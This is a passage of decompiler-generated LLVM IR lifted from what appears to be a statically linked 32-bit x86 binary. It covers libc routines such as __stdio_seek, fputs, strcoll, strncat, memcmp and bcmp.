  %v2_8065bc8 = load i16, i16* %v1_8065bc8, align 2
  %v3_8065bc8 = or i16 %v2_8065bc8, 8
  store i16 %v3_8065bc8, i16* %v1_8065bc8, align 2
  br label %dec_label_pc_8065bf5

dec_label_pc_8065bd1:                             ; preds = %dec_label_pc_8065bb6
  %v2_8065bd1 = and i16 %v2_8065bb6, 64
  %v3_8065bd1 = icmp eq i16 %v2_8065bd1, 0
  br i1 %v3_8065bd1, label %dec_label_pc_8065bef, label %dec_label_pc_8065bd5

dec_label_pc_8065bd5:                             ; preds = %dec_label_pc_8065bd1
  %v2_8065bd9 = call i32 @__stdio_wcommit(i32 %v0_8065bd8)
  %v1_8065be1 = icmp eq i32 %v2_8065bd9, 0
  %v1_8065be3 = icmp eq i1 %v1_8065be1, false
  br i1 %v1_8065be3, label %dec_label_pc_8065bc8, label %dec_label_pc_8065be5

dec_label_pc_8065be5:                             ; preds = %dec_label_pc_8065bd5
  %v0_8065be5 = load i32, i32* @ebx, align 4
  %v1_8065be5 = inttoptr i32 %v0_8065be5 to i16*
  %v2_8065be5 = load i16, i16* %v1_8065be5, align 2
  %v3_8065be5 = and i16 %v2_8065be5, -65
  store i16 %v3_8065be5, i16* %v1_8065be5, align 2
  %v0_8065be9 = load i32, i32* @ebx, align 4
  %v1_8065be9 = add i32 %v0_8065be9, 8
  %v2_8065be9 = inttoptr i32 %v1_8065be9 to i32*
  %v3_8065be9 = load i32, i32* %v2_8065be9, align 4
  %v2_8065bec = add i32 %v0_8065be9, 28
  %v3_8065bec = inttoptr i32 %v2_8065bec to i32*
  store i32 %v3_8065be9, i32* %v3_8065bec, align 4
  %v0_8065bef.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8065bef

dec_label_pc_8065bef:                             ; preds = %dec_label_pc_8065bd1, %dec_label_pc_8065be5
  %v9_8065bef = phi i32 [ %v0_8065bd8, %dec_label_pc_8065bd1 ], [ %v0_8065bef.pre, %dec_label_pc_8065be5 ]
  %v1_8065bef = inttoptr i32 %v9_8065bef to i16*
  %v2_8065bef = load i16, i16* %v1_8065bef, align 2
  %v3_8065bef = or i16 %v2_8065bef, 1
  store i16 %v3_8065bef, i16* %v1_8065bef, align 2
  br label %dec_label_pc_8065bf5

dec_label_pc_8065bf5:                             ; preds = %dec_label_pc_8065bc8, %dec_label_pc_8065bef
  %storemerge = phi i32 [ 0, %dec_label_pc_8065bef ], [ -1, %dec_label_pc_8065bc8 ]
  store i32 %v0_8065b94, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_8065ba0, { 1, 2, 0 }
  uselistorder i32 %v0_8065b94, { 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 8, 3, 2, 1, 7, 6, 5, 4, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8065bf5, { 1, 0 }
  uselistorder label %dec_label_pc_8065bef, { 1, 0 }
  uselistorder label %dec_label_pc_8065bb6, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8065c08 = add i32 %tmp5, 4
  %v2_8065c08 = inttoptr i32 %v1_8065c08 to i32*
  %v3_8065c08 = load i32, i32* %v2_8065c08, align 4
  %v2_8065c0b = load i32, i32* %arg2, align 4
  %v1_8065c11 = add i32 %arg1, 4
  %v2_8065c11 = inttoptr i32 %v1_8065c11 to i32*
  %v3_8065c11 = load i32, i32* %v2_8065c11, align 4
  %v4_8065c14 = call i32 @__libc_lseek64(i32 %v3_8065c11, i32 %v2_8065c0b, i32 %v3_8065c08, i32 %arg3)
  %v0_8065c1e = load i32, i32* @edx, align 4
  %v2_8065c1e = icmp slt i32 %v0_8065c1e, 0
  br i1 %v2_8065c1e, label %dec_label_pc_8065c29, label %dec_label_pc_8065c22

dec_label_pc_8065c22:                             ; preds = %entry
  %v1_8065c22 = load i32, i32* @ebx, align 4
  %v2_8065c22 = inttoptr i32 %v1_8065c22 to i32*
  store i32 %v4_8065c14, i32* %v2_8065c22, align 4
  %v0_8065c24 = load i32, i32* @edx, align 4
  %v1_8065c24 = load i32, i32* @ebx, align 4
  %v2_8065c24 = add i32 %v1_8065c24, 4
  %v3_8065c24 = inttoptr i32 %v2_8065c24 to i32*
  store i32 %v0_8065c24, i32* %v3_8065c24, align 4
  br label %dec_label_pc_8065c29

dec_label_pc_8065c29:                             ; preds = %entry, %dec_label_pc_8065c22
  %v0_8065c29 = phi i32 [ %v4_8065c14, %entry ], [ 0, %dec_label_pc_8065c22 ]
  ret i32 %v0_8065c29

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_lseek64, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_8065c29, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8065c30 = load i32, i32* @edi, align 4
  %v0_8065c31 = load i32, i32* @esi, align 4
  %v0_8065c32 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v1_8065c3a = add i32 %arg2, 52
  %v2_8065c3a = inttoptr i32 %v1_8065c3a to i32*
  %v3_8065c3a = load i32, i32* %v2_8065c3a, align 4
  store i32 %v3_8065c3a, i32* @edi, align 4
  %v1_8065c3d = icmp eq i32 %v3_8065c3a, 0
  %v1_8065c3f = icmp eq i1 %v1_8065c3d, false
  br i1 %v1_8065c3f, label %entry.dec_label_pc_8065c60_crit_edge, label %dec_label_pc_8065c41

entry.dec_label_pc_8065c60_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8065c60

dec_label_pc_8065c41:                             ; preds = %entry
  %v1_8065c41 = add i32 %arg2, 56
  store i32 %v1_8065c41, i32* @ebx, align 4
  %v4_8065c50 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134585853, i32 %v1_8065c41)
  %v0_8065c55 = load i32, i32* @ebx, align 4
  %v1_8065c58 = call i32 @pthread_mutex_lock(i32 %v0_8065c55)
  %v0_8065c62.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8065c60

dec_label_pc_8065c60:                             ; preds = %entry.dec_label_pc_8065c60_crit_edge, %dec_label_pc_8065c41
  %v0_8065c62 = phi i32 [ %arg2, %entry.dec_label_pc_8065c60_crit_edge ], [ %v0_8065c62.pre, %dec_label_pc_8065c41 ]
  %v0_8065c60 = load i32, i32* @edx, align 4
  %v4_8065c67 = inttoptr i32 %arg1 to i8*
  %v5_8065c67 = call i32 @__GI_fputs_unlocked(i8* %v4_8065c67, i32 %v0_8065c62, i32 %v0_8065c60, i32 %v0_8065c60)
  store i32 %v5_8065c67, i32* @ebx, align 4
  br i1 %v1_8065c3f, label %dec_label_pc_8065c86, label %dec_label_pc_8065c75

dec_label_pc_8065c75:                             ; preds = %dec_label_pc_8065c60
  %v3_8065c7e = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_8065c89.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8065c86

dec_label_pc_8065c86:                             ; preds = %dec_label_pc_8065c60, %dec_label_pc_8065c75
  %v0_8065c89 = phi i32 [ %v5_8065c67, %dec_label_pc_8065c60 ], [ %v0_8065c89.pre, %dec_label_pc_8065c75 ]
  store i32 %v0_8065c32, i32* @ebx, align 4
  store i32 %v0_8065c31, i32* @esi, align 4
  store i32 %v0_8065c30, i32* @edi, align 4
  ret i32 %v0_8065c89

; uselistorder directives
  uselistorder i32 (i32*, i32)* @__pthread_cleanup_pop_restore, { 36, 38, 2, 40, 41, 14, 16, 17, 18, 19, 20, 21, 0, 1, 3, 4, 5, 37, 44, 34, 6, 7, 35, 45, 42, 43, 8, 9, 22, 23, 24, 25, 26, 27, 28, 15, 10, 39, 29, 30, 11, 12, 13, 31, 32, 33 }
  uselistorder i32 (i32)* @pthread_mutex_lock, { 15, 13, 58, 10, 11, 39, 38, 37, 36, 35, 34, 33, 60, 59, 57, 56, 55, 14, 5, 20, 54, 53, 19, 4, 0, 1, 2, 3, 52, 51, 32, 31, 30, 29, 28, 27, 26, 40, 44, 12, 25, 24, 43, 42, 41, 23, 22, 21, 50, 49, 61, 9, 6, 18, 8, 7, 48, 47, 46, 45, 17, 16 }
  uselistorder i32 (i32*, i32, i32)* @__pthread_cleanup_push_defer, { 36, 38, 2, 41, 40, 15, 16, 17, 18, 19, 20, 21, 0, 1, 3, 4, 5, 37, 42, 34, 6, 7, 35, 45, 44, 43, 8, 9, 22, 23, 24, 25, 26, 27, 28, 14, 10, 39, 29, 30, 11, 12, 13, 31, 32, 33 }
  uselistorder i32 134585853, { 3, 4, 5, 6, 7, 8, 45, 46, 47, 48, 49, 50, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 33, 1, 34, 2, 35, 36, 37, 24, 25, 26, 27, 28, 29, 30, 38, 39, 40, 41, 44, 31, 42, 43, 32 }
  uselistorder i32 52, { 26, 27, 12, 1, 21, 0, 8, 9, 10, 31, 32, 22, 20, 13, 28, 29, 30, 23, 24, 17, 18, 19, 11, 2, 14, 4, 15, 3, 16, 6, 7, 5, 25 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8065c86, { 1, 0 }
  uselistorder label %dec_label_pc_8065c60, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8065c92 = ptrtoint i8* %arg1 to i32
  %v4_8065c9a.pre = load i32, i32* @eax, align 4
  %v8_8065c9a.pre = load i1, i1* @df, align 1
  %v9_8065c9a = select i1 %v8_8065c9a.pre, i32 -1, i32 1
  br label %dec_label_pc_8065c9a

dec_label_pc_8065c9a:                             ; preds = %dec_label_pc_8065c9e, %entry
  %v20_8065c9b = phi i32 [ %v23_8065c9b, %dec_label_pc_8065c9e ], [ %arg2, %entry ]
  %v4_8065c9a = phi i32 [ %v6_8065c9a, %dec_label_pc_8065c9e ], [ %v4_8065c9a.pre, %entry ]
  %v7_8065c9a = phi i32 [ %v10_8065c9a, %dec_label_pc_8065c9e ], [ %v4_8065c92, %entry ]
  %v1_8065c9a = inttoptr i32 %v7_8065c9a to i8*
  %v2_8065c9a = load i8, i8* %v1_8065c9a, align 1
  %v3_8065c9b = inttoptr i32 %v20_8065c9b to i8*
  %v4_8065c9b = load i8, i8* %v3_8065c9b, align 1
  %v15_8065c9b = icmp eq i8 %v2_8065c9a, %v4_8065c9b
  %v1_8065c9c = icmp eq i1 %v15_8065c9b, false
  br i1 %v1_8065c9c, label %dec_label_pc_8065ca6, label %dec_label_pc_8065c9e

dec_label_pc_8065c9e:                             ; preds = %dec_label_pc_8065c9a
  %v3_8065c9a = zext i8 %v2_8065c9a to i32
  %v5_8065c9a = and i32 %v4_8065c9a, -256
  %v6_8065c9a = or i32 %v3_8065c9a, %v5_8065c9a
  %v23_8065c9b = add i32 %v20_8065c9b, %v9_8065c9a
  %v10_8065c9a = add i32 %v7_8065c9a, %v9_8065c9a
  %v4_8065c9e = icmp eq i8 %v2_8065c9a, 0
  %v1_8065ca0 = icmp eq i1 %v4_8065c9e, false
  br i1 %v1_8065ca0, label %dec_label_pc_8065c9a, label %dec_label_pc_8065caa

dec_label_pc_8065ca6:                             ; preds = %dec_label_pc_8065c9a
  br label %dec_label_pc_8065caa

dec_label_pc_8065caa:                             ; preds = %dec_label_pc_8065c9e, %dec_label_pc_8065ca6
  %storemerge = phi i32 [ 1, %dec_label_pc_8065ca6 ], [ 0, %dec_label_pc_8065c9e ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8065c9a, { 1, 2, 0 }
  uselistorder i32 %v9_8065c9a, { 1, 0 }
  uselistorder label %dec_label_pc_8065caa, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-8 = alloca i32, align 4
  %v0_8065cb1 = load i32, i32* @esi, align 4
  store i32 %v0_8065cb1, i32* %stack_var_-8, align 4
  %v4_8065cb2 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8065cb2, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_8065cbf = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8065cc3 = call i32 @_strlen(i8* %v4_8065cbf)
  %v2_8065cc5 = add i32 %tmp, -1
  store i32 %v2_8065cc5, i32* %edi.global-to-local, align 4
  %v0_8065cc6 = load i32, i32* %edx.global-to-local, align 4
  %v8_8065cc913 = icmp eq i32 %v0_8065cc6, 0
  store i32 %v0_8065cc6, i32* @ecx, align 4
  br i1 %v8_8065cc913, label %dec_label_pc_8065cd4, label %dec_label_pc_8065ccc.lr.ph

dec_label_pc_8065ccc.lr.ph:                       ; preds = %entry
  %v4_8065ccc.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8065ccc.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8065ccc

dec_label_pc_8065ccc:                             ; preds = %dec_label_pc_8065ccc.lr.ph, %dec_label_pc_8065ccc.dec_label_pc_8065cc9_crit_edge
  %v8_8065ccc = phi i1 [ %v8_8065ccc.pre, %dec_label_pc_8065ccc.lr.ph ], [ %v5_8065ccd, %dec_label_pc_8065ccc.dec_label_pc_8065cc9_crit_edge ]
  %v4_8065ccc = phi i32 [ %v4_8065ccc.pre, %dec_label_pc_8065ccc.lr.ph ], [ %v0_8065cce, %dec_label_pc_8065ccc.dec_label_pc_8065cc9_crit_edge ]
  %v2_8065cd614 = phi i32 [ %v2_8065cc5, %dec_label_pc_8065ccc.lr.ph ], [ %v7_8065ccd, %dec_label_pc_8065ccc.dec_label_pc_8065cc9_crit_edge ]
  %v0_8065ccc = load i32, i32* %esi.global-to-local, align 4
  %v1_8065ccc = inttoptr i32 %v0_8065ccc to i8*
  %v2_8065ccc = load i8, i8* %v1_8065ccc, align 1
  %v3_8065ccc = zext i8 %v2_8065ccc to i32
  %v5_8065ccc = and i32 %v4_8065ccc, -256
  %v6_8065ccc = or i32 %v5_8065ccc, %v3_8065ccc
  store i32 %v6_8065ccc, i32* %eax.global-to-local, align 4
  %v9_8065ccc = select i1 %v8_8065ccc, i32 -1, i32 1
  %v10_8065ccc = add i32 %v9_8065ccc, %v0_8065ccc
  store i32 %v10_8065ccc, i32* %esi.global-to-local, align 4
  %v3_8065ccd = inttoptr i32 %v2_8065cd614 to i8*
  store i8 %v2_8065ccc, i8* %v3_8065ccd, align 1
  %v4_8065ccd = load i32, i32* %edi.global-to-local, align 4
  %v5_8065ccd = load i1, i1* @df, align 1
  %v6_8065ccd = select i1 %v5_8065ccd, i32 -1, i32 1
  %v7_8065ccd = add i32 %v6_8065ccd, %v4_8065ccd
  store i32 %v7_8065ccd, i32* %edi.global-to-local, align 4
  %v0_8065cce = load i32, i32* %eax.global-to-local, align 4
  %v3_8065cce = trunc i32 %v0_8065cce to i8
  %v4_8065cce = icmp eq i8 %v3_8065cce, 0
  %v1_8065cd0 = icmp eq i1 %v4_8065cce, false
  br i1 %v1_8065cd0, label %dec_label_pc_8065ccc.dec_label_pc_8065cc9_crit_edge, label %dec_label_pc_8065cd7

dec_label_pc_8065ccc.dec_label_pc_8065cc9_crit_edge: ; preds = %dec_label_pc_8065ccc
  %v0_8065cc9.pre = load i32, i32* @ecx, align 4
  %v1_8065cc9 = add i32 %v0_8065cc9.pre, -1
  %v8_8065cc9 = icmp eq i32 %v1_8065cc9, 0
  store i32 %v1_8065cc9, i32* @ecx, align 4
  br i1 %v8_8065cc9, label %dec_label_pc_8065cd4, label %dec_label_pc_8065ccc

dec_label_pc_8065cd4:                             ; preds = %dec_label_pc_8065ccc.dec_label_pc_8065cc9_crit_edge, %entry
  %v2_8065cd6.lcssa = phi i32 [ %v2_8065cc5, %entry ], [ %v7_8065ccd, %dec_label_pc_8065ccc.dec_label_pc_8065cc9_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8065cd6 = inttoptr i32 %v2_8065cd6.lcssa to i8*
  store i8 0, i8* %v3_8065cd6, align 1
  %v4_8065cd6 = load i32, i32* %edi.global-to-local, align 4
  %v5_8065cd6 = load i1, i1* @df, align 1
  %v6_8065cd6 = select i1 %v5_8065cd6, i32 -1, i32 1
  %v7_8065cd6 = add i32 %v6_8065cd6, %v4_8065cd6
  store i32 %v7_8065cd6, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8065cd7

dec_label_pc_8065cd7:                             ; preds = %dec_label_pc_8065ccc, %dec_label_pc_8065cd4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8065cdb = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8065cdb, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8065cc9, { 1, 0 }
  uselistorder i32 %v0_8065cce, { 1, 0 }
  uselistorder i32 %v7_8065ccd, { 0, 2, 1 }
  uselistorder i1 %v5_8065ccd, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* @df, { 101, 102, 0, 1, 13, 103, 14, 104, 105, 24, 106, 2, 3, 113, 114, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 4, 5, 6, 7, 8, 9, 10, 11, 12, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 107, 108, 109, 110, 111, 112 }
  uselistorder label %dec_label_pc_8065cd7, { 1, 0 }
  uselistorder label %dec_label_pc_8065ccc, { 1, 0 }
}

define i32 @memcmp_bytes() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v15_8065ce1 = ptrtoint i32* %stack_var_-12 to i32
  %v0_8065ce6 = load i32, i32* @eax, align 4
  store i32 %v0_8065ce6, i32* %stack_var_-8, align 4
  %v0_8065cea = load i32, i32* @edx, align 4
  store i32 %v0_8065cea, i32* %stack_var_-12, align 4
  %v2_8065ced = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_8065cf1

dec_label_pc_8065cf1:                             ; preds = %dec_label_pc_8065cf1, %entry
  %v0_8065cf8 = phi i32 [ %v1_8065cf8, %dec_label_pc_8065cf1 ], [ %v15_8065ce1, %entry ]
  %v0_8065cf7 = phi i32 [ %v1_8065cf7, %dec_label_pc_8065cf1 ], [ %v2_8065ced, %entry ]
  %v1_8065cf1 = inttoptr i32 %v0_8065cf7 to i8*
  %v2_8065cf1 = load i8, i8* %v1_8065cf1, align 1
  %v3_8065cf1 = zext i8 %v2_8065cf1 to i32
  %v1_8065cf4 = inttoptr i32 %v0_8065cf8 to i8*
  %v2_8065cf4 = load i8, i8* %v1_8065cf4, align 1
  %v3_8065cf4 = zext i8 %v2_8065cf4 to i32
  %v1_8065cf7 = add i32 %v0_8065cf7, 1
  %v1_8065cf8 = add i32 %v0_8065cf8, 1
  %v2_8065cf9 = sub nsw i32 %v3_8065cf1, %v3_8065cf4
  %v12_8065cf9 = icmp eq i32 %v2_8065cf9, 0
  br i1 %v12_8065cf9, label %dec_label_pc_8065cf1, label %dec_label_pc_8065cfd

dec_label_pc_8065cfd:                             ; preds = %dec_label_pc_8065cf1
  store i32 %v0_8065cea, i32* @edx, align 4
  store i32 %v0_8065ce6, i32* @ecx, align 4
  ret i32 %v2_8065cf9

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @bcmp() local_unnamed_addr {
entry:
  %tmp149 = call i32 @__decompiler_undefined_function_0()
  %tmp150 = call i8* @__decompiler_undefined_function_3()
  %tmp151 = call i8* @__decompiler_undefined_function_3()
  %v0_8065d06 = load i32, i32* @ebx, align 4
  %v4_8065d0a = ptrtoint i8* %tmp151 to i32
  store i32 %v4_8065d0a, i32* @ecx, align 4
  %v4_8065d0e = ptrtoint i8* %tmp150 to i32
  store i32 %v4_8065d0e, i32* @ebx, align 4
  %v6_8065d17 = icmp ugt i32 %tmp149, 15
  br i1 %v6_8065d17, label %dec_label_pc_8065d34.preheader, label %dec_label_pc_8065f97.preheader

dec_label_pc_8065d34.preheader:                   ; preds = %entry
  %v2_8065d3849 = urem i32 %v4_8065d0e, 4
  %v3_8065d3850 = icmp eq i32 %v2_8065d3849, 0
  %v1_8065d3b54 = icmp eq i1 %v3_8065d3850, false
  br i1 %v1_8065d3b54, label %dec_label_pc_8065d1e, label %dec_label_pc_8065d3d

dec_label_pc_8065d1e:                             ; preds = %dec_label_pc_8065d34.preheader, %dec_label_pc_8065d2e
  %v0_8065d32 = phi i32 [ %v1_8065d32, %dec_label_pc_8065d2e ], [ %v4_8065d0a, %dec_label_pc_8065d34.preheader ]
  %v0_8065d33 = phi i32 [ %v1_8065d33, %dec_label_pc_8065d2e ], [ %v4_8065d0e, %dec_label_pc_8065d34.preheader ]
  %stack_var_12.055 = phi i32 [ %v4_8065d2e, %dec_label_pc_8065d2e ], [ %tmp149, %dec_label_pc_8065d34.preheader ]
  %v1_8065d1e = inttoptr i32 %v0_8065d33 to i8*
  %v2_8065d1e = load i8, i8* %v1_8065d1e, align 1
  %v3_8065d1e = zext i8 %v2_8065d1e to i32
  %v1_8065d21 = inttoptr i32 %v0_8065d32 to i8*
  %v2_8065d21 = load i8, i8* %v1_8065d21, align 1
  %v3_8065d21 = zext i8 %v2_8065d21 to i32
  %v2_8065d24 = sub nsw i32 %v3_8065d21, %v3_8065d1e
  %v12_8065d24 = icmp eq i32 %v2_8065d24, 0
  store i32 %v2_8065d24, i32* @edx, align 4
  %v1_8065d28 = icmp eq i1 %v12_8065d24, false
  br i1 %v1_8065d28, label %dec_label_pc_8065fa0, label %dec_label_pc_8065d2e

dec_label_pc_8065d2e:                             ; preds = %dec_label_pc_8065d1e
  %v4_8065d2e = add i32 %stack_var_12.055, -1
  %v1_8065d32 = add i32 %v0_8065d32, 1
  store i32 %v1_8065d32, i32* @ecx, align 4
  %v1_8065d33 = add i32 %v0_8065d33, 1
  store i32 %v1_8065d33, i32* @ebx, align 4
  %v2_8065d38 = urem i32 %v1_8065d33, 4
  %v3_8065d38 = icmp eq i32 %v2_8065d38, 0
  %v1_8065d3b = icmp eq i1 %v3_8065d38, false
  br i1 %v1_8065d3b, label %dec_label_pc_8065d1e, label %dec_label_pc_8065d3d

dec_label_pc_8065d3d:                             ; preds = %dec_label_pc_8065d2e, %dec_label_pc_8065d34.preheader
  %v0_8065e22 = phi i32 [ %v4_8065d0a, %dec_label_pc_8065d34.preheader ], [ %v1_8065d32, %dec_label_pc_8065d2e ]
  %stack_var_12.0.lcssa = phi i32 [ %tmp149, %dec_label_pc_8065d34.preheader ], [ %v4_8065d2e, %dec_label_pc_8065d2e ]
  %v0_8065e8c = phi i32 [ %v4_8065d0e, %dec_label_pc_8065d34.preheader ], [ %v1_8065d33, %dec_label_pc_8065d2e ]
  %v1_8065d43 = urem i32 %v0_8065e22, 4
  %v2_8065d43 = icmp eq i32 %v1_8065d43, 0
  %v1_8065d46 = icmp eq i1 %v2_8065d43, false
  %v2_8065e0c = udiv i32 %stack_var_12.0.lcssa, 4
  br i1 %v1_8065d46, label %dec_label_pc_8065e00, label %dec_label_pc_8065d4c

dec_label_pc_8065d4c:                             ; preds = %dec_label_pc_8065d3d
  %v1_8065d55 = urem i32 %v2_8065e0c, 4
  %v9_8065d58 = icmp eq i32 %v1_8065d55, 1
  br i1 %v9_8065d58, label %dec_label_pc_8065d8c, label %dec_label_pc_8065d5d

dec_label_pc_8065d5d:                             ; preds = %dec_label_pc_8065d4c
  %v2_8065d55 = icmp eq i32 %v1_8065d55, 0
  br i1 %v2_8065d55, label %dec_label_pc_8065d86, label %dec_label_pc_8065d5f

dec_label_pc_8065d5f:                             ; preds = %dec_label_pc_8065d5d
  %v9_8065d5f = icmp eq i32 %v1_8065d55, 3
  %v1_8065d62 = inttoptr i32 %v0_8065e22 to i32*
  %v2_8065d62 = load i32, i32* %v1_8065d62, align 4
  %v1_8065d64 = inttoptr i32 %v0_8065e8c to i32*
  %v2_8065d64 = load i32, i32* %v1_8065d64, align 4
  br i1 %v9_8065d5f, label %dec_label_pc_8065d77, label %dec_label_pc_8065d68

dec_label_pc_8065d68:                             ; preds = %dec_label_pc_8065d5f
  %v1_8065d6a = add i32 %v0_8065e22, -8
  store i32 %v2_8065d64, i32* @edx, align 4
  %v1_8065d6f = add i32 %v0_8065e8c, -8
  store i32 %v1_8065d6f, i32* @ebx, align 4
  %v1_8065d72 = add nuw nsw i32 %v2_8065e0c, 2
  br label %dec_label_pc_8065dc7

dec_label_pc_8065d77:                             ; preds = %dec_label_pc_8065d5f
  %v1_8065d79 = add i32 %v0_8065e22, -4
  %v1_8065d7c = add i32 %v0_8065e8c, -4
  store i32 %v1_8065d7c, i32* @ebx, align 4
  %v1_8065d7f = add nuw nsw i32 %v2_8065e0c, 1
  br label %dec_label_pc_8065db3

dec_label_pc_8065d86:                             ; preds = %dec_label_pc_8065d5d
  %v1_8065d86 = inttoptr i32 %v0_8065e22 to i32*
  %v2_8065d86 = load i32, i32* %v1_8065d86, align 4
  store i32 %v2_8065d86, i32* @eax, align 4
  %v1_8065d88 = inttoptr i32 %v0_8065e8c to i32*
  %v2_8065d88 = load i32, i32* %v1_8065d88, align 4
  store i32 %v2_8065d88, i32* @edx, align 4
  br label %dec_label_pc_8065da5

dec_label_pc_8065d8c:                             ; preds = %dec_label_pc_8065d4c
  %v1_8065d8c = inttoptr i32 %v0_8065e22 to i32*
  %v2_8065d8c = load i32, i32* %v1_8065d8c, align 4
  %v1_8065d8e = add nsw i32 %v2_8065e0c, -1
  %v1_8065d93 = add i32 %v0_8065e22, 4
  %v1_8065d96 = inttoptr i32 %v0_8065e8c to i32*
  %v2_8065d96 = load i32, i32* %v1_8065d96, align 4
  %v1_8065d98 = add i32 %v0_8065e8c, 4
  br label %dec_label_pc_8065d9b

dec_label_pc_8065d9b:                             ; preds = %dec_label_pc_8065ddc, %dec_label_pc_8065d8c
  %v0_8065dd776 = phi i32 [ %v1_8065d8e, %dec_label_pc_8065d8c ], [ %v1_8065dd7, %dec_label_pc_8065ddc ]
  %v4_8065d9f = phi i32 [ %v2_8065d96, %dec_label_pc_8065d8c ], [ %v3_8065dd2, %dec_label_pc_8065ddc ]
  %v0_8065d9b = phi i32 [ %v1_8065d93, %dec_label_pc_8065d8c ], [ %v1_8065ddc, %dec_label_pc_8065ddc ]
  %storemerge25.in = phi i32 [ %v1_8065d98, %dec_label_pc_8065d8c ], [ %v1_8065ddf, %dec_label_pc_8065ddc ]
  %stack_var_-48.0 = phi i32 [ %v2_8065d8c, %dec_label_pc_8065d8c ], [ %v3_8065dc7, %dec_label_pc_8065ddc ]
  store i32 %storemerge25.in, i32* @ebx, align 4
  %v1_8065d9b = inttoptr i32 %v0_8065d9b to i32*
  %v2_8065d9b = load i32, i32* %v1_8065d9b, align 4
  store i32 %v2_8065d9b, i32* @eax, align 4
  %v1_8065d9d = inttoptr i32 %storemerge25.in to i32*
  %v2_8065d9d = load i32, i32* %v1_8065d9d, align 4
  store i32 %v2_8065d9d, i32* @edx, align 4
  %v15_8065d9f = icmp eq i32 %stack_var_-48.0, %v4_8065d9f
  %v1_8065da3 = icmp eq i1 %v15_8065d9f, false
  br i1 %v1_8065da3, label %dec_label_pc_8065df0, label %dec_label_pc_8065da5

dec_label_pc_8065da5:                             ; preds = %dec_label_pc_8065d9b, %dec_label_pc_8065d86
  %v0_8065dd775 = phi i32 [ %v0_8065dd776, %dec_label_pc_8065d9b ], [ %v2_8065e0c, %dec_label_pc_8065d86 ]
  %v0_8065dae = phi i32 [ %storemerge25.in, %dec_label_pc_8065d9b ], [ %v0_8065e8c, %dec_label_pc_8065d86 ]
  %v1_8065da8 = phi i32 [ %v2_8065d9d, %dec_label_pc_8065d9b ], [ %v2_8065d88, %dec_label_pc_8065d86 ]
  %v0_8065da8 = phi i32 [ %v2_8065d9b, %dec_label_pc_8065d9b ], [ %v2_8065d86, %dec_label_pc_8065d86 ]
  %v0_8065da5 = phi i32 [ %v0_8065d9b, %dec_label_pc_8065d9b ], [ %v0_8065e22, %dec_label_pc_8065d86 ]
  %v1_8065da5 = add i32 %v0_8065da5, 4
  %v2_8065da5 = inttoptr i32 %v1_8065da5 to i32*
  %v3_8065da5 = load i32, i32* %v2_8065da5, align 4
  %v12_8065da8 = icmp eq i32 %v0_8065da8, %v1_8065da8
  %v1_8065dae = add i32 %v0_8065dae, 4
  %v2_8065dae = inttoptr i32 %v1_8065dae to i32*
  %v3_8065dae = load i32, i32* %v2_8065dae, align 4
  %v1_8065db1 = icmp eq i1 %v12_8065da8, false
  br i1 %v1_8065db1, label %dec_label_pc_8065df6, label %dec_label_pc_8065db3

